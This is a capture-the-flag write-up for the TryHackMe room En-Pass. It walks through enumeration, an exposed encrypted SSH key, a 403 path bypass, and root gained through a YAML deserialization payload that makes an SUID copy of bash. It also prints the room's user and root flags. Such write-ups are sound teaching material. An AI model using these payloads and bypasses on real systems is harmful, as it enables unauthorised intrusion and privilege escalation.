# Tryhackme.com Room : En-Pass

`https://tryhackme.com/room/enpass`

## Instance

```bash
export IP='10.10.236.111'
```

## Nmap

```
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial Foothold

We land on a static webpage on `:8001/`.

We find the string `Ehvw ri Oxfn!!` on the page which is `rot 3` for `Best of Luck!!`.

We `gobuster` the website and find

```
/web (Status: 301)
/index.html (Status: 200)
/reg.php (Status: 200)
/403.php (Status: 403)
/zip (Status: 301
```



There is a folder `/zip` with a bunch of zip files.

```
a.zip
a0.zip
a1.zip
...
a100.zip
```

Let's continue enumeration, we'll come back to this later.



Then there is the `/web` folder which doesn't allow directory listing.

Let's dig in with multiple `gobuster` runs to find something interesting in there.

```
/web/resources/infoseek/configure/key
```

And we find an `ssh` key, still need to find a username :

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
9plhOtJX6ZUjtq92E/sinTG0wwc94VmwiA5lvGmjUtBjah4epDJs8Vt/tIpSTg8k
28ef1Q8+5+Kl4alJZWNF0RVpykVEXKqYw3kJBqQDTa4aH75MczJGfk4TY5kdZFO3
tPVajm46V2C/9OrjOpEVg2jIom+e4kJAaJdB7Jr7br3xoaYhe5YEUiSGM8YD7SUZ
azrAFkIoZ72iwdeVGR7CWgdwmDWw/nFvg6Ug/fsAGobDCf2CtwLEUtLL/XMpLvEb
AS0Wic1zPjCCGaVSyijImrh3beYgWbZzz7h5gmqfoycVKS4S+15tFZBZRA0wH05m
XfDw6It7ZZtP73i8XoOAg1gAbv6o/vR3GkF798bc0fV4bGJrpQ9MIEpOphR1SNuI
x0gjtCfIyYjwJmwlWeNmELyDAO3oIxYZBSydHko0EUBnbeOw+Jj3xvEdNO3PhZ7G
3UPIoZMH4KAdcXy15tL0MYGmXyOx+oHuDEPNHxkR3+lJ1C+BXJwtrSXU+qz9u/Sz
qavHdwzxc8+HiiWcGxN3LEdgfsKg/TKXA5X/TE7DnjVmhsL4IBCOIyPxF8ClXok7
YMwNymz269J85Y73gemMfhwvGC18dNs0xfYEMUtDWbrwJDsTezdBmssMvOHSjpr5
w+Z+sJvNabMIBVaQs+jqJoqm8EARNzA40CBQUJJdmqBfPV/xSmHzNOLdTspOShQN
5iwP3adKdq+/TCp2l8SaXQedMIf6DCPmcuUVrYK4pjAr7NzFVNUgqbYLT1J0thGr
gQBk+0RlQadN7m7BW835YeyvN0GKM35f7tUylJHcfTdjE832zB24iElDW483FvJy
RhM+bOBts0z+zVUx0Ua+OEM1sxwAAlruur4+ucCPFV1XrWYWfLo3VXvTbhPiZcXF
fmOJKaFxBFjbARQMR0IL5CH8tPz2Kbeaepp2sUZcgDZSHWAbvg0j8QVkisJJ/H7G
Vg6MdIRf+Ka9fPINxyrWnxDoIVqP5/HyuPjrmRN9wMA8lWub8okH9nlJoss3n8j5
xom80wK197o29NN6BWEUuagXSHdnU2o+9L991kScaC9XXOuRgqFrDRFBUUn1VOWJ
3p+lTLNscC+eMP0Be3U6R85b/o3grdb610A1V88pnDWGYa/oVgXelUh1SsHA0tuI
om679j9qdIP7O8m3PK0Wg/cSkjdj0vRxT539tAY1+ci99FXnO1Touo7mlaA4eRTK
LQLmzFcucQODcm3FEy18doT2llDTyloD2PmX+ipzB7mbdqw7pUXPyFTnGZoKrnhM
27L629aKxoM19Mz0xP8BoQMcCOCYklIw1vkaiPgXAYkNXXtBzwWn1SFcU57buaED
CJCnh3g19NZ/VjJ1zERJLjK1U1l/RtlejISAB35AYFUnKDG3iYXLRP3iT/R22BMd
z4uSYN10O1nr4EppAOMtdSdd9PJuwxKN/3nJvymMf3O/MmC/8DJOIyadZzEw7EbP
iU5caghFrCuuhCagiwYr+qeKM3BwMUBPeUXVWTCVmFkA7jR86XTMfjkD1vgDFj/8
-----END RSA PRIVATE KEY-----
```

Tried a random username `enpass` but the key need a passphrase. Let's crack it while we look at the rest.



We have a file `reg.php` with an input form.

For some reason, the php code is visible (Added comments while reversing this) :

```php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
       // Must not contains letters or numbers
      $val = explode(",",$title); // Splitted on ','
      $sum = 0;
      
      for($i = 0 ; $i < 9; $i++){
            if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                // First element len = 2
                // Ninth element len = 3
                if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                    // elements must not
                    $sum = $sum+ (bool)$val[$i]."<br>"; 
            }
      }

      if ( ($sum) == 9 ){
          echo $result;//do not worry you'll get what you need.
          echo " Congo You Got It !! Nice ";
      }else{
          echo "  Try Try!!";
      }
    
    } else{
      echo "  Try Again!! ";
    }     
}
```

We find that the following input satisfy the confitions
```
##,@@,$$,^^,&&,**,((,)),!!!
```

We get
```
Nice. Password : cimihan_are_you_here?
```
Maybe the password for the zip files ?
Actually, this is the passphrase for the `ssh` key.

We downloaded all the zip files and we extract them using :
```
find . -name "*.zip" -exec sh -c 'unzip -B {} && rm {}' \;
```
We use the `-B` switch because all zip contain a file with the same name.

they all contain the same word :
```
sadman
```
Tried using this as the user to login via `ssh` but it doesn't work.
hmm kinda weird.. all this for nothing ?

So i decided to have a look at a writeup to see if someone figured out what to do with the `zip` files. But nop, nothing to do.

I saw someone talking about the `403.php` file, which I kinda had overlooked.
He made the observation that it wasn't used in `/web` even tho we receive a `403`.
Good observation.

They suggest the tool `https://github.com/intrudir/403fuzzer` which is a tool that try different permutations of the url to bypass the `403`.
And we find an url that bypass the `403.php` :
```
curl 'http://10.10.236.111:8001/403.php/..;/'
```

We get :
```
Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.
```

So here we go, we got the username `imsau`

We can now login via `ssh` and retrieve `/home/imsau/user.txt` :
```
1c5ccb6ce6f3561e302e0e516c633da9
```

## Priv Esc
We find a python script in `/opt/scripts/file.py` :
```
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
```

Not sure who is running this, nothing in `/etc/crontab` and `/etc/cron.d`

Let's run `pspy` to see what is happening.
We see
```
2021/05/12 03:27:01 CMD: UID=0    PID=3602   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml
2021/05/12 03:27:01 CMD: UID=0    PID=3601   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml
```

We can't write in `/opt/script` so we can't really highjack the `yaml` lib



I googled `python yaml exploit` and found this `https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf`.

They go in details about what is the vulnerability.



We know that a cronjob will execute `/opt/scrpt/file.py` and use `/tmp/file.yml` as input.

We create this simple `yaml` payload :

```
echo '!!python/object/apply:posix.system ["cp /bin/bash /tmp/bash && chmod +s /tmp/bash"]' > /tmp/file.yml
```

This will create a copy of `bash` and set the `SUID` bit.

Now we just need to launch it using `/tmp/bash -p` and we are now root !



when we `ls -la` the `/root` folder. We see that there is a bunch of `root.txt` files.

Using `python -c 'import os;print(os.listdir("."))'` we can see that it's a bunch of `root.txt` files with some spaces appended to the filename.

We can cat them all and retrieve the unique values using `cat root* | sort | uniq -c` and we get :

```
     99 5d45f08ee939521d59247233d3f8faf
      1 5d45f08ee939521d59247233d3f8fafd
```

The one that is unique is probably the flag :

```
5d45f08ee939521d59247233d3f8fafd
```



## Wrap up

* This was a cool not too hard box.
* Kinda got stuck at the `403.php` bypass. Didn't know about these bypass techniques so it's a cool new trick that I learned.

